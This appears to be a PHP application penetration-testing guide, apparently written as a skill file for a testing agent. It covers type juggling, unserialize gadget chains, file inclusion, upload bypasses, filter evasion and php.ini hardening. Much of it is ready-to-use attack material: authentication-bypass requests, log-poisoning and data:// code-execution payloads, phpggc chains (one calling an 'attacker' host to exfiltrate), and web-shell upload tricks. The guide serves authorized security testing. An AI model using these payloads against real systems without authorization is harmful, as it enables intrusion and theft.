---
name: php
description: PHP application security testing covering type juggling, object injection (unserialize), LFI/RFI, stream wrappers, dangerous function abuse, framework gadget chains, and modern hardening defaults
---

# PHP

PHP powers WordPress, Laravel, Symfony, and most of the legacy web. Distinct from other languages because of its loose typing, its `unserialize()` primitive, its built-in stream wrappers (`php://filter`, `data://`, `phar://`), and its very large ecosystem of frameworks with known gadget chains. Most modern PHP defaults are safe (`allow_url_include=Off`, hardened `php.ini`), but the *application* frequently reintroduces the dangerous patterns.

## Attack Surface

**Language Primitives (high-impact)**
- `unserialize()` on any attacker-controlled data → object injection
- `include`, `require`, `include_once`, `require_once` with user input → LFI/RFI
- `eval()`, `assert()` (PHP 5), `preg_replace(/e)` (PHP 5) → RCE
- `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()`, backticks → command exec
- `file_get_contents()`, `fopen()`, `curl_exec()` with user input → SSRF / file read
- `move_uploaded_file()` with insufficient validation → arbitrary file write
- `$_GET`, `$_POST`, `$_COOKIE`, `$_REQUEST`, `$_SERVER` → all untrusted

**Type System**
- Loose comparison `==` triggers implicit type coercion (type juggling)
- `strcmp()`, `in_array()`, `array_search()` default to loose comparison
- `switch` statement uses loose `==` for cases
- `json_decode()` of user input — type can be controlled (int vs string)
- Magic hashes: MD5 hashes starting with `0e` + digits are treated as float 0 in loose comparison

**Stream Wrappers**
- `php://filter` — read with base64/rot13 transforms (defeat extension check, encode binary)
- `php://input` — treat raw POST body as file
- `data://` — embed data in URI (often base64 PHP)
- `phar://` — open archive; metadata is deserialized on access (POI side channel)
- `zip://` — treat zip as file
- `expect://` — command exec (if extension loaded)
- `glob://` — pattern matching

**Configuration**
- `php.ini` flags: `allow_url_include`, `allow_url_fopen`, `disable_functions`, `open_basedir`, `expose_php`
- FPM/PHP-FPM exposure (`/status`, `/ping`) when bound to public
- OPcache file cache write targets (info leak / overwrite)
- Error display: `display_errors=On` in production

**Frameworks (when in scope)**
- Laravel, Symfony, CodeIgniter, Yii, Zend — each has POP chains in `phpggc`
- Monolog, Guzzle, Doctrine, SwiftMailer, SlimPHP — libraries with POP chains
- Composer autoloader reveals installed versions via `composer.lock` (often webroot)

## High-Value Targets

- Any `unserialize($_COOKIE[...])` or `unserialize($_SESSION[...])` — POP entry point
- Pages with `?page=`, `?file=`, `?template=`, `?lang=`, `?module=` — LFI
- Form/file upload handlers — extension checks bypassable via double extension, null byte, `phar://`
- Login/password-reset endpoints using `==` or `strcmp()` for credential comparison
- JWT/HMAC validation using `hash_equals()` alternative or `==` on hex digest
- `adminer.php` or `phpmyadmin` exposed in webroot (auth bypass via `pma_*` cookies on shared installations)
- Old endpoints still calling `mysql_*` functions, `ereg()`, `split()` (PCRE issues)
- `phpinfo()` pages — leak paths, disabled functions, env vars
- Composer.json / composer.lock exposed in webroot
- Files named `.swp`, `.~`, `.bak`, `.old` (vim/emacs backups)

## Reconnaissance

**Version Detection**
```bash
# HTTP header
curl -sI https://target/ | grep -i 'x-powered-by'

# Exposed PHPSESSID cookie, phpinfo()
curl -s https://target/phpinfo.php | grep -i 'php version\|disable_functions\|open_basedir'
curl -s https://target/info.php

# OOB via /server-status, /fpm-status, /fpm-ping
curl -s https://target/server-status
curl -s https://target/fpm-status
```

**Framework / Library Detection**
```bash
# Composer.lock (often a 403 or 200 depending on server)
curl -s -o /dev/null -w '%{http_code}\n' https://target/composer.json
curl -s -o /dev/null -w '%{http_code}\n' https://target/composer.lock
curl -s https://target/composer.lock 2>/dev/null | jq '.packages[].name' 2>/dev/null

# Cookie + header patterns
# Laravel:  XSRF-TOKEN, laravel_session; APP_KEY in config
# Symfony:  PHPSESSID with sfc format
# WordPress: wp-* cookies (covered in wordpress skill)
```

**Laravel APP_KEY Extraction**
```bash
# /config/app.php exposed, debug mode on, .env in webroot, error pages leak
curl -s https://target/.env | grep APP_KEY
curl -s 'https://target/' -H 'Accept: application/json' | grep -i 'APP_KEY\|APP_DEBUG'  # debug page
```

**Dangerous Function Check** (when phpinfo is reachable)
```bash
# parse phpinfo() for these values
disable_functions=exec,system,passthru,shell_exec,popen,proc_open
# If disable_functions is empty → very permissive
# If many exec functions are listed → harder direct RCE; pivot to file write + include
```

## Key Vulnerabilities

### Type Juggling (loose comparison)

PHP's `==` coerces operands to a common type before comparing. This is the most reliably exploitable PHP issue when the application trusts the input type.

**Magic Hashes (MD5)**
```php
// VULNERABLE
if (md5($_GET['password']) == md5('known_hash_starting_with_0e')) { ... }

// Strings '240610708' and 'QNKCDZO' both MD5 to '0e...' (numeric string)
// Loose comparison treats both as 0 → equal
// POST any password whose MD5 is 0e[digits] and you authenticate
```

**Integer Bypass**
```php
// VULNERABLE
if ($_POST['password'] == 'Admin_Password') { login_as_admin(); }
// POST password=0 → "0" == "Admin_Password" coerces non-numeric string to int 0; both sides become 0; equal → logged in
```

**Array vs String**
```php
// VULNERABLE
$input = $_GET['role'];  // ?role[]=admin
if ($input == 'user') { /* won't match — array != string, but strcmp behaves differently */ }

// strcmp() with array → returns NULL, NULL == 0 in loose comparison
if (strcmp($_POST['password'], $stored) == 0) { login(); }
// POST password[]=anything → strcmp returns NULL → NULL == 0 → login
```

**JSON Type Control**
```php
// VULNERABLE
$input = json_decode(file_get_contents('php://input'));
if ($input->password == 'secret') { login(); }
// Send {"password": 0}  → int 0 == string 'secret'  → true  → login
// Send {"password": true}  → bool true == 'secret'  → true  → login
```

**Tests**
```bash
# Magic hash pair for MD5 (any input whose MD5 starts with 0e + all digits)
curl -X POST https://target/login -d 'password=240610708'
curl -X POST https://target/login -d 'password=QNKCDZO'

# Integer bypass
curl -X POST https://target/login -d 'password=0' -H 'Content-Type: application/x-www-form-urlencoded'
curl -X POST https://target/login -d '{"password": 0}' -H 'Content-Type: application/json'

# Array bypass
curl -X POST https://target/login -d 'password[]=x'
```

### PHP Object Injection (POI / POP)

`unserialize()` on attacker-controlled bytes is the highest-impact PHP class. Triggers object instantiation, then magic method calls (`__wakeup`, `__destruct`, `__toString`, `__unserialize`) — chained, these execute arbitrary code or write/delete files.

**Where it hides**
```php
unserialize($_COOKIE['user']);           // session cookies
unserialize($_GET['data']);              // query string
unserialize(base64_decode($_POST['x']));  // POST body
unserialize($row['meta_value']);         // DB column (WordPress postmeta — covered in WP skill)
unserialize(file_get_contents('phar://...path/.../file.jpg'));  // phar stream wrapper
```

**Gadget Chains (phpggc)**
```bash
# phpggc is preinstalled in many pentest distros; if not, clone and `make`
phpggc -l   # list all chains

# Laravel (very common)
phpggc Laravel/RCE1 system 'id'
phpggc Laravel/RCE2 system 'id'
phpggc Laravel/RCE3 system 'id'
phpggc Laravel/RCE4 system 'id'
phpggc Laravel/RCE5 system 'id'
phpggc Laravel/RCE6 system 'id'
phpggc Laravel/RCE7 system 'id'
phpggc Laravel/RCE8 system 'id'
phpggc Laravel/RCE9 system 'id'
phpggc Laravel/RCE10 system 'id'
phpggc Laravel/RCE11 system 'id'
phpggc Laravel/RCE12 system 'id'
phpggc Laravel/RCE13 system 'id'

# Monolog (universal — Monolog is everywhere)
phpggc Monolog/RCE1 system 'id'
phpggc Monolog/RCE2 system 'id'
phpggc Monolog/RCE3 system 'id'

# Symfony
phpggc Symfony/RCE1 system 'id'
phpggc Symfony/RCE4 system 'id'
phpggc Symfony/RCE7 system 'id'

# Guzzle, Doctrine, SwiftMailer, SlimPHP, CodeIgniter — all in phpggc
```

**Laravel Cookie + APP_KEY (very common critical)**
```php
// Laravel encrypts cookies with APP_KEY (AES-256-CBC); payload is signed
// If you have APP_KEY → forge any encrypted cookie → unserialize payload runs
// APP_KEY leaks via: .env exposure, debug mode error pages, /config/app.php backup, git history

# Forge a Laravel cookie with a gadget chain
phpggc Laravel/RCE1 system 'curl http://attacker/exfil' | base64
# Encrypt + sign with APP_KEY → set as laravel_session or XSRF-TOKEN
```

**Phar deserialization (image-upload side channel)**
```php
// Phar archives include serialized metadata; PHP deserializes on phar:// access
// 1. Upload a polyglot (JPEG + PHAR) to a profile pic or attachment field
// 2. Trigger phar://include via LFI: ?page=phar://./uploads/avatar.jpg
// 3. Phar metadata deserializes → gadget chain fires

phpggc Monolog/RCE1 system 'id' > /tmp/payload.phar
# Combine with valid JPEG header bytes for image upload bypass
```

### Local / Remote File Inclusion (LFI / RFI)

**LFI Patterns**
```php
include($_GET['page']);                        // direct
include("/themes/" . $_GET['template']);       // concatenation
include("lang/" . $_COOKIE['lang'] . ".php");  // cookie
include($_SERVER['HTTP_X_FORWARDED_FOR']);     // header
```

**RFI** (less common in modern PHP — `allow_url_include=Off` by default since PHP 7.4)
```php
include($_GET['url']);  // works only if allow_url_include=On
// Host: $page=http://attacker/shell.php
```

**Wrappers for LFI to RCE**
```bash
# Log poisoning (Apache access/error log)
curl -A '<?php system($_GET["c"]); ?>' https://target/
curl 'https://target/?page=/var/log/apache2/access.log&c=id'

# /proc/self/environ (CGI)
curl 'https://target/?page=/proc/self/environ&c=id' \
  -H 'User-Agent: <?php system("id"); ?>'

# PHP filter chains — read source with base64 (defeat extension check / sanitize)
curl 'https://target/?page=php://filter/convert.base64-encode/resource=index'
curl 'https://target/?page=php://filter/convert.base64-encode/resource=config.php'

# data://
curl 'https://target/?page=data://text/plain,<?php system("id"); ?>'
curl 'https://target/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+'

# expect:// (rare; ext must be loaded)
curl 'https://target/?page=expect://id'

# phar:// (see POI above)
curl 'https://target/?page=phar://./uploads/avatar.jpg/whatever'

# Self-include for RCE
# 1. Upload session file with PHP payload
# 2. Include /var/lib/php/sessions/sess_<PHPSESSID>
```

**Null Byte / Path Truncation (legacy only, PHP < 5.3.4)**
```bash
curl 'https://target/?page=../../../etc/passwd%00'
# Modern PHP rejects null bytes in file paths
```

### File Upload Bypasses

PHP file upload bypasses are still common when `$_FILES` is moved to a webroot location.

**Checks to defeat**
- Extension blocklist (`php`, `phtml`, `php3`, `php4`, `php5`, `php7`, `pht`, `phar`)
- MIME type check (`getimagesize()`, finfo, `$_FILES['type']`)
- Content-Type from request header (trivial to forge)
- File content check (magic bytes for images)

**Bypasses**
```bash
# Double extension
shell.php.jpg
shell.jpg.php
shell.phtml    # Apache MultiViews often treats .phtml as PHP

# Null byte (legacy)
shell.php%00.jpg

# Case
shell.pHp
shell.PhP

# .htaccess upload
# Upload a .htaccess that maps .jpg to PHP:
AddType application/x-httpd-php .jpg

# Polyglot (valid JPEG + PHP)
# Prepend JPEG header: \xFF\xD8\xFF\xE0
# Append <?php system($_GET['c']); ?> after image data
# Pass getimagesize() (depending on image size/dimensions)

# Content-Type spoof in multipart form
curl -F 'file=@shell.jpg;type=image/jpeg' https://target/upload
```

### Dangerous Function Abuse

**Command Injection**
```php
// VULNERABLE
system("ping " . $_GET['host']);
exec("convert " . $_GET['file'] . " output.png");
passthru("nslookup " . $_GET['domain']);
$output = `whois $_GET['domain']`;

// Sinks to test
;  |  &  $()  `  newline  >  <
&  ;  $IFS  %0a  %0d  '  "
```

**eval() / assert() / preg_replace()**
```php
eval($_GET['code']);                 // direct RCE
assert("'foo' === '$bar'");          // PHP 5; PHP 7+ asserts strings, not expressions
preg_replace('/(.*)/e', 'system("$1")', $_GET['x']);  // PHP 5 only, /e removed in 7
```

**SQL Injection** (covered in detail in `vulnerabilities/sql_injection` skill)
- `mysql_query()` legacy
- `mysqli_query()` with concatenation
- `$wpdb->query()` / `->get_results()` in WordPress without `prepare()`
- PDO with emulated prepares (PDO::ATTR_EMULATE_PREPARES=true on some MySQL drivers)

**SSRF**
- `file_get_contents($_GET['url'])` — supports http, https, file, ftp, gopher (with PHP 5)
- `curl_exec($ch)` with user-controlled URL — supports all curl protocols (gopher, dict, ftp, etc.)
- `fopen($url, 'r')` — file/http/ftp

**XSS** (covered in `vulnerabilities/xss` skill)
- `echo $_GET['q']` — never escaped
- `print $_POST['msg']`
- `<?= $_GET['q'] ?>` short echo
- All outputs need `htmlspecialchars($x, ENT_QUOTES, 'UTF-8')`

**XXE** (covered in `vulnerabilities/xxe` skill)
- `simplexml_load_string($xml)` with `LIBXML_NOENT` default
- `DOMDocument::loadXML()` without `libxml_disable_entity_loader(true)` (PHP < 8.0)
- PHP 8.0+ disables external entity loading by default — XXE is mostly historical

## Bypass Techniques

**WAF on type juggling** — when the WAF strips `0` and `QNKCDZO`:
- Try `0.0`, `0e0`, `00`, `+0`
- Use `password[]=x` array bypass
- Try `Content-Type: application/json` with `{"password": 0}` — different sink

**WAF on `php://` wrappers** — when `php://filter` is blocked:
- `PHP://filter` (case)
- `pHp://filter`
- `php://Filter/convert.base64-encode/resource=`
- Nested: `php://filter/read=convert.base64-encode/resource=php://filter/...`

**WAF on `unserialize` keywords** — when payload keywords trigger:
- URL-encode the entire payload
- Use HTTP/2 or chunked transfer encoding
- Send as JSON, base64 of the serialized payload
- Pack the serialized object with `gzcompress` / `gzuncompress` if app uses that

**Disable functions bypass** — when `exec`/`system` are disabled:
- `mail()` with `-X` flag for log poisoning
- `putenv()` + `mail()` for LD_PRELOAD
- `FFI` (PHP 7.4+) — call libc directly
- `imagemagick` via `Imagick` (delegate invocation)
- `proc_open` may not be disabled even when exec/system are
- `pcntl_exec` if pcntl is loaded
- Write to webroot + include via LFI

**open_basedir bypass** — when filesystem access is restricted:
- SplFileObject with `glob://` (sometimes allowed)
- `ini_set('open_basedir', '...')` if `ini_set` is not disabled
- `chdir()` + `ini_set()` chain
- Phar/zip wrappers can sometimes escape basedir
- `SplFileInfo::getRealPath()` returns the resolved path even if access is denied

## Tenant / Multi-Tenancy

PHP SaaS apps often have multi-tenant patterns that are weak:
- `$_GET['company_id']` not bound to session/tenant
- `WHERE tenant_id = $_SESSION['tenant']` — relying on session not on JWT/signed context
- Per-tenant database: `switch_db($tenant_id)` — verify the switch is real
- File storage: per-tenant subdirectory but the user supplies the path prefix

```php
// VULNERABLE — tenant taken from request
$tenant = $_GET['tenant'];
$stmt = $pdo->query("SELECT * FROM orders WHERE tenant_id = $tenant");

// Tests: switch tenant ID; compare data across users; sign requests as tenant A with tenant B's id
```

## Tooling

**Detection & SAST**
- `php -i` / `phpinfo()` — config inspection
- `composer audit` — SCA on installed packages
- PHP_CodeSniffer + security ruleset
- SonarPHP
- Psalm / PHPStan (with security extensions)
- Progpilot (taint analysis)

**Dynamic Analysis / Exploitation**
- phpggc — gadget chain generator (`composer global require phpggc/phpggc`)
- Burp Suite — request replay, param fuzz, macro for multipart
- sqlmap (when SQLi suspected)
- `ffuf` + PHP wrapper wordlist for LFI/RFI
- `nikto` — checks for phpinfo, exposed backups
- `wpscan` (when WP — see wordpress skill)
- `nuclei` — PHP-specific templates in `http/vulnerabilities/php/`

**Shell & Post-Ex**
- `p0wny-shell` (single PHP web shell)
- `b374k` (more featureful)
- Reverse shell generators (`revshells.com`)
- When you land on the box, prefer Python or system shell over a web shell

**Hardening Reference** (when authorized for advisory)
- `php.ini` recommendations
  - `expose_php = Off`
  - `display_errors = Off`, `log_errors = On`
  - `allow_url_fopen = Off`, `allow_url_include = Off`
  - `disable_functions = exec,system,passthru,shell_exec,popen,proc_open,curl_exec,curl_multi_exec,parse_ini_file,show_source`
  - `open_basedir = /var/www/html`
  - `session.cookie_httponly = 1`, `session.cookie_secure = 1`, `session.cookie_samesite = "Lax"`
  - `expose_php = Off`, `cgi.fix_pathinfo = 0`
  - `upload_max_filesize` and `post_max_size` per app needs
- File permissions: `chmod 440 wp-config.php`, `chown -R www-data:www-data`
- Move config files outside webroot when possible
- Disable PHP execution in `wp-content/uploads/` via `.htaccess` or nginx config

## Testing Methodology

1. **Fingerprint** — confirm PHP version, framework, libraries (composer.lock, headers, error pages)
2. **Enumerate endpoints** — admin panels, login, password reset, file download, AJAX handlers
3. **Test LFI** — every parameter that takes a file path (page, file, template, lang, include)
4. **Test POI** — every `unserialize` sink (cookie, header, query, body, file_get_contents(phar://))
5. **Test type juggling** — login, password reset, JWT/HMAC validation, CSRF token validation
6. **Test command/SQLi/XSS** — standard sinks; PHP apps often have all of them
7. **Test file upload** — extension checks, MIME checks, content checks; chain with LFI for RCE
8. **Test dangerous functions** — eval/assert/preg_replace/system/exec/passthru where reachable
9. **Test framework-specific** — Laravel APP_KEY extraction, Symfony secret, etc.
10. **Post-auth (if creds obtained)** — admin panel RCE, file editor, plugin install, phpinfo, debug endpoints

## Validation Requirements

- **POI RCE**: gadget chain sent to sink → out-of-band callback or file write verified
- **Type juggling auth bypass**: authentication succeeds with `password=0` or magic-hash value
- **LFI**: file contents disclosed (e.g., `/etc/passwd`, `wp-config.php` with DB password visible)
- **RCE via LFI**: log poisoning or phar deserialization confirmed via reverse shell
- **File upload**: arbitrary file written to webroot, file accessed and executed, command exec verified
- **SSRF**: internal endpoint hit (169.254.169.254 metadata, internal admin port, etc.)
- **Command injection**: command output in response, or out-of-band callback
- **Framework chain**: APP_KEY or similar extracted, forged payload validated, privileged action succeeds

## Common False-Positive Patterns

- `php://filter` "works" but returns empty / 0 bytes — wrapper blocked by `disable_functions` or `open_basedir`
- `unserialize` in source code but input is HMAC-signed — try to find the signing key, not the deserialization
- "LFI" parameter reflected in 404 vs 200 — mod_rewrite or front controller masks the actual behavior
- `eval()` in source but only ever called with hardcoded strings — confirm the input flow
- Type juggling appears in tests but login still fails — credential comparison may use `===` or `password_verify()`
- Composer.lock present but doesn't list the framework you suspected — check both `require` and `require-dev`, plus transitive deps
